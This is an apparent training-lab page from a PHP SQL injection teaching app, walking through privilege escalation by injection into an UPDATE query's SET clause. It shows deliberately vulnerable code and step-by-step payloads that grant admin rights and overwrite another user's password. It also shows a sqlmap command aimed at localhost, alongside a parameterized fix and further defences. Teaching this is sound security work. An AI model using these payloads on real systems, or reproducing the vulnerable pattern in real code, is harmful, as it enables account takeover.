<?php if ( ! defined('SQL_INJECTION_IN_PHP') ) die('Direct access not permitted'); ?>

<nav aria-label="breadcrumb" class="mb-3">
  <ol class="breadcrumb">
    <li class="breadcrumb-item"><a href="?action=walkthroughs">Walkthroughs</a></li>
    <li class="breadcrumb-item active">Privilege Escalation</li>
  </ol>
</nav>

<div class="d-flex align-items-center gap-3 mb-4">
  <h2 class="mb-0">7. Privilege Escalation via SQLi</h2>
  <span class="badge bg-danger">Intermediate</span>
  <span class="badge bg-secondary">UPDATE Injection</span>
</div>

<div class="card mb-4">
  <div class="card-header bg-dark text-white"><strong>Overview</strong></div>
  <div class="card-body">
    <p>When an UPDATE query is built by concatenating user input, an attacker can inject additional column assignments into the SET clause. This allows modifying columns the application never intended to expose — like <code>account_type</code>, <code>is_admin</code>, or <code>password</code>.</p>
    <p class="mb-0"><strong>Affected file:</strong> <code>pages/privesc.php</code> | <strong>Safe counterpart:</strong> <code>pages/updateSafe.php</code></p>
  </div>
</div>

<div class="card mb-4 border-danger">
  <div class="card-header bg-danger text-white"><strong>Vulnerable Code</strong></div>
  <div class="card-body">
<pre class="bg-light p-3 rounded"><code>$first_name = $_POST['first_name'];
$last_name  = $_POST['last_name'];
$id         = $_POST['uid'];

// Raw string interpolation — attacker controls the SET clause content
$sql = "UPDATE user
        SET firstname='{$first_name}', lastname='{$last_name}'
        WHERE id={$id}";</code></pre>
  </div>
</div>

<div class="card mb-4 border-warning">
  <div class="card-header bg-warning text-dark"><strong>Attack Walkthrough — Step by Step</strong></div>
  <div class="card-body">

    <h6 class="fw-bold">Step 1 — Confirm the injection point</h6>
    <p>Enter a single quote in First Name. If you see a DB error, the field is injectable.</p>
    <div class="bg-light p-2 rounded mb-3"><strong>First Name:</strong> <code>'</code></div>

    <h6 class="fw-bold">Step 2 — Escalate your own account to admin</h6>
    <div class="bg-light p-2 rounded mb-1"><strong>First Name:</strong> <code>anything', account_type='admin</code></div>
    <p class="text-muted small mb-3">
      Resulting SQL: <code>UPDATE user SET firstname='anything', account_type='admin', lastname='' WHERE id=X</code><br>
      The comma after <code>'anything'</code> appends a new assignment to the SET clause. The application only intended to update <code>firstname</code> and <code>lastname</code>.
    </p>

    <h6 class="fw-bold">Step 3 — Escalate a specific user (scoped with WHERE)</h6>
    <div class="bg-light p-2 rounded mb-1"><strong>First Name:</strong> <code>x', account_type='admin' WHERE id=8-- </code></div>
    <p class="text-muted small mb-3">The injected WHERE replaces the original — only user 8 is affected. The trailing <code>--</code> comments out the original WHERE clause.</p>

    <h6 class="fw-bold">Step 4 — Escalate ALL users</h6>
    <div class="bg-light p-2 rounded mb-1"><strong>First Name:</strong> <code>x', account_type='admin' WHERE '1'='1</code></div>
    <p class="text-muted small mb-3">The tautology makes the WHERE always true. Every user in the table becomes admin.</p>

    <h6 class="fw-bold">Step 5 — Change another user's password</h6>
    <div class="bg-light p-2 rounded mb-1"><strong>First Name:</strong> <code>x', password='hacked' WHERE id=8-- </code></div>
    <p class="text-muted small mb-3">Same technique — inject a password column assignment to take over a different account.</p>

    <a href="?action=privesc" class="btn btn-sm btn-outline-danger">Open Privilege Escalation Demo →</a>
  </div>
</div>

<div class="card mb-4 border-success">
  <div class="card-header bg-success text-white"><strong>Fix — Parameterized UPDATE</strong></div>
  <div class="card-body">
<pre class="bg-light p-3 rounded"><code>$sql = "UPDATE user
        SET firstname = :first_name,
            lastname  = :last_name
        WHERE id = :id";

$stmt = $pdo->prepare($sql);
$stmt->bindParam('first_name', $_POST['first_name']);
$stmt->bindParam('last_name',  $_POST['last_name']);
$stmt->bindParam('id',         (int) $_POST['uid'], PDO::PARAM_INT);
$stmt->execute();</code></pre>
    <p class="mb-0 text-success">Bound parameters prevent the <code>'</code> in <code>anything', account_type='admin</code> from being treated as SQL. It's stored as the literal string <code>anything', account_type='admin</code> in the <code>firstname</code> column.</p>
  </div>
</div>

<div class="card mb-4">
  <div class="card-header bg-dark text-white"><strong>Additional Defences</strong></div>
  <div class="card-body">
    <ul class="mb-0">
      <li><strong>Never update privilege columns via user-controlled forms</strong> — account_type, is_admin, role should only be changed through an explicitly privileged admin endpoint.</li>
      <li><strong>Row-level access control</strong> — verify the logged-in user's ID matches the target ID before running any UPDATE.</li>
      <li><strong>Allowlist the columns you update</strong> — build the SET clause from a hard-coded list, not from request parameters.</li>
      <li><strong>Audit log</strong> — log all privilege changes with timestamp, actor, and old/new value.</li>
    </ul>
  </div>
</div>

<div class="card">
  <div class="card-header bg-secondary text-white"><strong>Tools</strong></div>
  <div class="card-body">
    <pre class="bg-light p-2 rounded small">sqlmap -u "http://localhost:8080/profile.php?action=privesc" \
  --data="first_name=test&last_name=test&uid=1&escalate=1" \
  --technique=E --level=3 --batch</pre>
  </div>
</div>
